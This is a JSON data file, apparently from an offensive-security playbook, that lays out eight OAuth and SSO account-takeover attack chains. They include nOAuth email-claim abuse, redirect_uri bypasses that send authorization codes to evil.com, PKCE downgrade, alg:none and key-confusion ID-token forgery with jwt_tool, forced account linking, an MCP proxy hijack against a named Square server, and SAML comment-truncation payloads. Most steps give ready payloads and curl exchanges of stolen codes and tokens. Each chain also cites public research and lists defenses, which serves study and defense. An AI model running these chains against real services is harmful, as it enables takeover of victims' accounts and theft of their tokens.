@@ -1,0 +1,396 @@
+{
+  "domain": "OAuth",
+  "domainLabel": "OAuth / SSO → ATO",
+  "domainOrder": 3,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "nOAuth: захват аккаунта по одному email через «Вход через Microsoft»",
+      "level": "intermediate",
+      "impact": "Полный захват аккаунта любой жертвы по её email без взаимодействия; работает между тенантами. Баги класса nOAuth на крупных SaaS платят.",
+      "why": "Атакующий просто меняет атрибут email в одноразовом тенанте Entra ID на адрес жертвы, и один клик «Вход через Microsoft» логинит его как жертву - без фишинга и кражи токенов.",
+      "precondition": "Цель использует OIDC «Вход через Microsoft» через мультитенантный endpoint common и сопоставляет пользователей по изменяемому claim email вместо неизменяемых sub+iss (или oid+tid), игнорируя email_verified.",
+      "tags": [
+        "oidc",
+        "entra",
+        "mutable-claim",
+        "cross-idp",
+        "ato"
+      ],
+      "realWorld": "Descope «nOAuth» (Microsoft Entra ID, июнь 2023); Doyensec «Common OAuth Vulnerabilities», захват через изменяемый claim (январь 2025).",
+      "defense": "Идентифицировать по неизменяемым sub+iss (или oid+tid), отклонять email_verified=false и никогда не доверять изменяемым email/upn для сопоставления аккаунтов.",
+      "steps": [
+        {
+          "title": "Проверить, что приложение сопоставляет по email",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "decode the ID token from a test login; compare sub/oid/tid vs email; test whether changing the IdP email re-points the app account"
+        },
+        {
+          "title": "Задать email пользователя атакующего равным email жертвы",
+          "kind": "note",
+          "detail": "Graph PATCH /users/{id} body {\"mail\":\"{USER_B}\"} (no domain/claim verification of the email claim)"
+        },
+        {
+          "title": "Запустить «Вход через Microsoft» с личностью атакующего",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "/authorize?client_id={CLIENT_ID}&response_type=code&scope=openid email&redirect_uri={REDIRECT_URI}; the RP receives an id_token with email={USER_B}",
+          "success": "RP логинит как {USER_B}"
+        },
+        {
+          "title": "RP сопоставляет по email и пускает в аккаунт жертвы",
+          "kind": "note",
+          "q": "",
+          "detail": "confirm the session is the victim's, then pivot to data/admin"
+        },
+        {
+          "title": "Обобщить: проверить aud/azp/iss и обработку email_verified",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "most vulnerable RPs never check iss/tid and accept email_verified=false"
+        }
+      ]
+    },
+    {
+      "title": "Ложь allow-list: обход redirect_uri и кража authorization code",
+      "level": "newbie",
+      "impact": "Кража authorization code (или access_token) жертвы и обмен его на полный захват аккаунта; path-traversal варианты платили, а на confidential-client SSO это обычно Critical.",
+      "why": "Сервер авторизации «проверяет» redirect_uri, но один /../, %252F, зарегистрированный соседний поддомен или собственный open redirect клиента превращают разрешённый URI в точку эксфильтрации.",
+      "precondition": "AS делает сопоставление по префиксу/подстроке/regex вместо точного, либо разрешённый URL клиента содержит open redirect или контент под влиянием атакующего.",
+      "tags": [
+        "redirect-uri",
+        "open-redirect",
+        "code-theft",
+        "path-traversal"
+      ],
+      "realWorld": "pixiv HackerOne #1861974 (path traversal в redirect_uri, $2k); GSA #665651 и отчёт #405100 (кража токенов через redirect_uri); рекомендация точного сопоставления Doyensec (2025).",
+      "defense": "Точное строковое сопоставление redirect_uri (scheme+host+port+path), без wildcard и подпутей, и устранить open redirect на каждом разрешённом хосте.",
+      "steps": [
+        {
+          "title": "Снять отпечаток валидации redirect_uri",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "test exact vs prefix vs subdomain vs path; try appended path, @evil.com, .evil.com, trailing ?/#, and double-encoding"
+        },
+        {
+          "title": "Обход через path-traversal / кодирование",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "redirect_uri=https://client.com/cb/../../redirect?u=https://evil.com; vary %2F, %252F, %5C, /./, ;, %23",
+          "success": "code / #access_token уходит на evil.com"
+        },
+        {
+          "title": "Сцепить зарегистрированный поддомен или open redirect клиента",
+          "kind": "payload",
+          "q": "Open Redirect",
+          "detail": "redirect_uri=https://allowed.client.com/out?next=https://evil.com (allow-listed host forwards the code onward)"
+        },
+        {
+          "title": "Доставить ссылку authorize и перехватить редирект",
+          "kind": "note",
+          "detail": "listener logs ?code= / #access_token= and immediately POSTs to /token"
+        },
+        {
+          "title": "Обменять украденный code на токены",
+          "kind": "note",
+          "detail": "curl -d grant_type=authorization_code -d code=... -d redirect_uri={REDIRECT_URI} -d client_id={CLIENT_ID} https://as/token"
+        }
+      ]
+    },
+    {
+      "title": "Dirty Dancing: кража токенов через собственные страницы клиента",
+      "level": "advanced",
+      "impact": "Эксфильтрация code/access_token/id_token вообще без бага в redirect_uri, через легитимные страницы клиента, с последующим захватом; Detectify сцепил это у нескольких крупных провайдеров.",
+      "why": "Атака собирает «странную машину» из переключения response_type/response_mode, наполовину сломанных потоков и window.opener/postMessage/Referer/history, чтобы выкачать креды через доверенные источники клиента.",
+      "precondition": "У клиента есть same-domain страница, отражающая параметры URL, слабый по origin слушатель postMessage, либо callback, утекающий fragment через Referer/сторонний JS, и AS разрешает переключать response_type/response_mode.",
+      "tags": [
+        "postmessage",
+        "window-opener",
+        "referer-leak",
+        "response-type",
+        "token-leak"
+      ],
+      "realWorld": "Frans Rosen / Detectify Labs, «Account hijacking using Dirty Dancing in sign-in OAuth-flows» (2022).",
+      "defense": "Зафиксировать response_type/response_mode на клиента, строго проверять origin в postMessage, ставить Referrer-Policy: no-referrer на callback-страницах и никогда не отражать fragment-параметры.",
+      "steps": [
+        {
+          "title": "Картировать точки утечки на разрешённом origin",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "find reflective pages, postMessage handlers lacking e.origin checks, third-party JS, and Referer-leaking redirects/images"
+        },
+        {
+          "title": "Переключить поток в более «протекающую» форму",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "change response_type=code to \"token id_token\" and/or response_mode=fragment/form_post so the credential lands where a sink can read it"
+        },
+        {
+          "title": "«Сломать состояние», чтобы креды попали на нужную страницу",
+          "kind": "note",
+          "q": "",
+          "detail": "pick a deeper allow-listed redirect_uri that fails open and exposes location.hash / location.search"
+        },
+        {
+          "title": "Эксфильтрация через opener / postMessage / Referer / history",
+          "kind": "note",
+          "detail": "popup reads opener.location.hash; or rogue postMessage to a weak listener; or force an outbound request leaking Referer: ...#access_token="
+        },
+        {
+          "title": "Воспроизвести утёкшие креды",
+          "kind": "note",
+          "detail": "curl -H \"Authorization: Bearer STOLEN_TOKEN\" https://api/me; or exchange the leaked code at /token"
+        }
+      ]
+    },
+    {
+      "title": "Понижение PKCE + инъекция authorization code: удаляем саму защиту",
+      "level": "advanced",
+      "impact": "Инъекция authorization code жертвы (или атакующего) в сессию другой стороны ради захвата аккаунта, обходя главную защиту публичных клиентов.",
+      "why": "PKCE «включён», но раз AS требует его лишь при наличии code_challenge, атакующий просто удаляет параметр - и вся защита испаряется.",
+      "precondition": "AS поддерживает, но не требует PKCE (включает только при наличии code_challenge), и клиент не использует или некорректно проверяет state.",
+      "tags": [
+        "pkce",
+        "code-injection",
+        "downgrade",
+        "public-client"
+      ],
+      "realWorld": "RFC 9700 «Best Current Practice for OAuth 2.0 Security» (2025), разделы про PKCE-downgrade и authorization-code injection; OAuth 2.1 делает PKCE обязательным.",
+      "defense": "Принимать code_verifier на /token только если code_challenge был в /authorize, требовать S256 и выдавать одноразовые, короткоживущие, привязанные к клиенту code.",
+      "steps": [
+        {
+          "title": "Прощупать принуждение PKCE",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "start a flow, strip code_challenge/code_challenge_method, confirm the AS still issues a code and /token succeeds without code_verifier"
+        },
+        {
+          "title": "Понизить authorization request",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "remove code_challenge (and try S256->plain if accepted); ensure no usable state"
+        },
+        {
+          "title": "Инъекция code между сессиями",
+          "kind": "note",
+          "q": "",
+          "detail": "capture the victim code front-channel and inject it into your /token, or inject your code into the victim session for forced login"
+        },
+        {
+          "title": "Обмен без verifier",
+          "kind": "note",
+          "detail": "curl -d grant_type=authorization_code -d code=VICTIM_CODE -d redirect_uri={REDIRECT_URI} -d client_id={CLIENT_ID} https://as/token (no code_verifier)"
+        },
+        {
+          "title": "Проверить replay и повторное использование между клиентами",
+          "kind": "note",
+          "q": "",
+          "detail": "confirm whether codes are single-use, short-lived, and bound to the requesting client"
+        }
+      ]
+    },
+    {
+      "title": "Pass-the-Token: когда RP не проверяет, кому выдан токен",
+      "level": "intermediate",
+      "impact": "Аутентификация как любая жертва повтором токена/assertion, выпущенного для другого клиента или сайта, либо подделкой неподписанного/HMAC-сконфьюженного ID-токена; баги класса Salt затронули миллиарды пользователей соцлогина.",
+      "why": "RP трактует «валидно выглядящий токен» как «токен для меня», поэтому токен атакующего из его собственного OAuth-приложения или самоподписанный alg:none JWT логинит его как жертву.",
+      "precondition": "RP принимает access_token/id_token/code из управляемого пользователем параметра и не проверяет, что подпись, aud/azp и iss привязывают креденшл именно к этому RP.",
+      "tags": [
+        "token-confusion",
+        "jwt",
+        "alg-none",
+        "key-confusion",
+        "aud-confusion"
+      ],
+      "realWorld": "Исследование Salt Labs по верификации OAuth-токенов (2023): Grammarly, Vidio, Bukalapak («Pass-The-Token»), Expo CVE-2023-28131, Booking.com; плюс классические JWT alg=none / RS256-HS256 confusion.",
+      "defense": "Проверять подпись по JWKS провайдера, фиксировать alg и требовать aud/azp==свой client_id, iss==ожидаемый IdP и свежий nonce; никогда не принимать токены из пользовательских параметров без этих проверок.",
+      "steps": [
+        {
+          "title": "Найти, где RP принимает креденшл",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "look for client-side POST {access_token|code|id_token} to the RP's own /auth/social verify endpoint"
+        },
+        {
+          "title": "Pass-the-token между клиентами",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "mint an access_token via your own OAuth app, then substitute it (or swap code->access_token) into the victim RP's verify call"
+        },
+        {
+          "title": "Конфьюз подписи ID-токена",
+          "kind": "payload",
+          "q": "JSON Web Token",
+          "detail": "craft id_token with alg:none, or RS256->HS256 key confusion (HMAC-sign with the IdP public key), tampering sub/email",
+          "success": "RP принимает подделанный id_token и логинит как жертва"
+        },
+        {
+          "title": "Эксплуатировать confusion aud / azp / iss",
+          "kind": "note",
+          "q": "",
+          "detail": "reuse a token whose aud is a different client, or whose iss is an IdP the RP did not expect (cross-IdP Sign in with X)"
+        },
+        {
+          "title": "Подделать и воспроизвести",
+          "kind": "command",
+          "q": "jwt_tool",
+          "detail": "jwt_tool <id_token> -X a (alg:none); jwt_tool <id_token> -X k -pk jwks_pub.pem (key confusion); POST to /auth/social"
+        }
+      ]
+    },
+    {
+      "title": "Подсадить или захватить: принудительная привязка и pre-hijacking аккаунта",
+      "level": "intermediate",
+      "impact": "Привязка федеративной личности атакующего к аккаунту жертвы (или закладка спящей точки опоры до регистрации жертвы) для устойчивого захвата, переживающего сброс пароля; в исследовании уязвимы были ~35 из 75 топовых сайтов.",
+      "why": "Два трюка с таймингом на логике привязки аккаунтов: один бьёт по link-callback с отсутствующим state, другой стартует ещё до того, как у жертвы появился аккаунт.",
+      "precondition": "Callback «привязать соцсеть» не привязывает state к сессии (отсутствует/статичен/предсказуем), либо сайт позволяет засеять/смержить аккаунт на email жертвы без подтверждения владения.",
+      "tags": [
+        "account-linking",
+        "login-csrf",
+        "pre-hijacking",
+        "state",
+        "forced-merge"
+      ],
+      "realWorld": "Sudhodanan и Paverd, «Pre-hijacked accounts» (USENIX Security 2022; MSRC); лабы OAuth-CSRF/forced-linking в PortSwigger Web Security Academy.",
+      "defense": "Обязательный одноразовый привязанный к сессии state, повторная аутентификация перед привязкой, проверка email/идентификатора до того как аккаунт станет рабочим, и сброс сессий плюс отвязка федеративных личностей при смене пароля.",
+      "steps": [
+        {
+          "title": "Проверить привязку state на link/login callback",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "remove/replay/guess state; see if the callback still links or logs in"
+        },
+        {
+          "title": "Принудительная привязка через login CSRF",
+          "kind": "payload",
+          "q": "Cross-Site Request Forgery",
+          "detail": "run the IdP flow yourself, keep the code unused, then auto-submit https://target/oauth/callback?code=ATTACKER_CODE (no state) into the victim's authenticated session"
+        },
+        {
+          "title": "Classic-Federated Merge (CFM)",
+          "kind": "note",
+          "q": "",
+          "detail": "pre-create a classic password account on victim@x.com; when the victim later Signs in with Google, the site silently merges into one account you both hold"
+        },
+        {
+          "title": "Trojan Identifier (TID)",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "attach an attacker-controlled federated id or recovery (phone / 2nd email) that survives the victim's password reset"
+        },
+        {
+          "title": "US / UEC и Non-Verifying IdP (NV)",
+          "kind": "note",
+          "detail": "keep a long-lived session alive across takeover, queue an email-change to the attacker, or assert the victim's email via an IdP that sends email_verified=false"
+        },
+        {
+          "title": "Вернуть доступ после онбординга жертвы",
+          "kind": "note",
+          "q": "",
+          "detail": "use the surviving session/identifier/recovery to regain the now-populated account"
+        }
+      ]
+    },
+    {
+      "title": "MCP-in-the-Middle: захват SaaS в один клик через OAuth-прокси",
+      "level": "advanced",
+      "impact": "Один клик даёт атакующему полный, устойчивый доступ к подключённому SaaS жертвы через сохранённые access/refresh токены MCP-сервера; продемонстрировано на боевом MCP-сервере Square в 2025.",
+      "why": "MCP «сервер посередине» одновременно и authorization server для клиентов, и единый upstream OAuth-клиент, поэтому статичный client_id плюс DCR без валидации redirect_uri обнуляют кэшированный consent для всех прежних пользователей.",
+      "precondition": "MCP-сервер проксирует OAuth с общим статичным upstream client_id, поддерживает Dynamic Client Registration без валидации redirect_uri или несёт redirect_uri внутри непривязанного state, и жертва ранее авторизовала MCP-сервер.",
+      "tags": [
+        "mcp",
+        "dcr",
+        "oauth-proxy",
+        "refresh-token",
+        "consent-bypass"
+      ],
+      "realWorld": "Obsidian Security «When MCP Meets OAuth: Common Pitfalls Leading to One-Click Account Takeover» (Square MCP, июль-сентябрь 2025); обновление MCP authorization spec / SEP-991 Client ID Metadata Documents (ноябрь 2025).",
+      "defense": "Валидировать redirect_uri по allow-list (в т.ч. для DCR), привязывать state к cookie с префиксом __Host-, требовать consent на уровне MCP и предпочесть Client ID Metadata Documents открытому DCR.",
+      "steps": [
+        {
+          "title": "Разведать auth-поверхность MCP",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "fetch /.well-known/oauth-authorization-server and protected-resource metadata; inspect DCR (/register) and the shared upstream client_id"
+        },
+        {
+          "title": "Протащить callback через DCR",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "POST /register {\"redirect_uris\":[\"https://{COLLAB}/cb\"]}; if unvalidated you now own a valid callback"
+        },
+        {
+          "title": "Спрятать redirect_uri атакующего в state",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "base64 state embedding {\"redirect_uri\":\"https://{COLLAB}/cb\"}; cached consent for the shared client_id means no prompt fires"
+        },
+        {
+          "title": "Заранее одобрить и передать ссылку жертве",
+          "kind": "note",
+          "q": "",
+          "detail": "complete the MCP consent yourself, capture the upstream AS URL (e.g. mcp.squareup.com/authorize, client sq0idp-...), and send that one-click link"
+        },
+        {
+          "title": "Обойти слабую привязку сессии",
+          "kind": "note",
+          "q": "",
+          "detail": "if the consent cookie lacks __Host- / session binding, inject it via subdomain (e.g. sto.wix.com) or XSS so the victim callback validates in attacker context"
+        },
+        {
+          "title": "Собрать code -> токены -> refresh-токены",
+          "kind": "note",
+          "detail": "exchange the captured code at /token, then persist with the long-lived refresh_token the MCP server stores for durable access"
+        }
+      ]
+    },
+    {
+      "title": "SAML comment truncation: вход как кто угодно с валидной подписью",
+      "level": "advanced",
+      "impact": "Аутентификация в SAML SP как произвольный пользователь (включая админов) через ответ, который IdP реально подписал для аккаунта атакующего; полный захват SSO во всех приложениях за этим IdP.",
+      "why": "XML-комментарий внутри NameID заставляет уязвимый парсер вернуть только текст до комментария, тихо усекая подписанную (но принадлежащую атакующему) личность до личности жертвы, не ломая подпись.",
+      "precondition": "SP использует SAML-библиотеку, чьё извлечение текста из DOM теряет текстовые узлы рядом с комментарием, либо проверяет подпись, не требуя, чтобы она покрывала заявленный NameID/assertion (signature wrapping).",
+      "tags": [
+        "saml",
+        "xml-comment",
+        "xsw",
+        "signature-wrapping",
+        "sso"
+      ],
+      "realWorld": "Раскрытие comment-truncation в SAML от Duo Labs / Kelby Ludwig (2018): CVE-2017-11427 python-saml, CVE-2017-11428 ruby-saml, CVE-2017-11429 saml2-js, CVE-2017-11430 omniauth-saml, CVE-2018-0489 Shibboleth.",
+      "defense": "Канонизировать и извлекать NameID после проверки подписи, отклонять узлы-комментарии в полях личности, проверять что ссылка подписи указывает на потребляемую assertion и обновить SAML-библиотеки до исправленных версий.",
+      "steps": [
+        {
+          "title": "Получить один валидный подписанный SAML-ответ",
+          "kind": "checklist",
+          "q": "saml",
+          "detail": "register/log in with your own IdP account (e.g. user@user.com.attacker.com) and capture the SAMLResponse"
+        },
+        {
+          "title": "Инъекция NameID через comment-truncation",
+          "kind": "payload",
+          "q": "SAML Injection",
+          "detail": "<NameID>{USER_B}<!---->.attacker.com</NameID> so the parser returns only {USER_B} while the signature stays valid",
+          "success": "вход как victim при валидной подписи"
+        },
+        {
+          "title": "Запасной вариант XML Signature Wrapping (XSW)",
+          "kind": "payload",
+          "q": "SAML Injection",
+          "detail": "wrap a forged unsigned <Assertion> (with the victim NameID) alongside the original signed assertion so validation checks one node and the app consumes the other"
+        },
+        {
+          "title": "Автоматизировать мутацию в Burp",
+          "kind": "note",
+          "detail": "use SAML Raider to clone/edit the assertion, apply the 8 XSW variants, and remove/relocate the Signature reference"
+        },
+        {
+          "title": "Воспроизвести на SP ACS",
+          "kind": "note",
+          "detail": "POST the tampered SAMLResponse to the SP AssertionConsumerService and confirm you are logged in as the victim"
+        }
+      ]
+    }
+  ]
+}
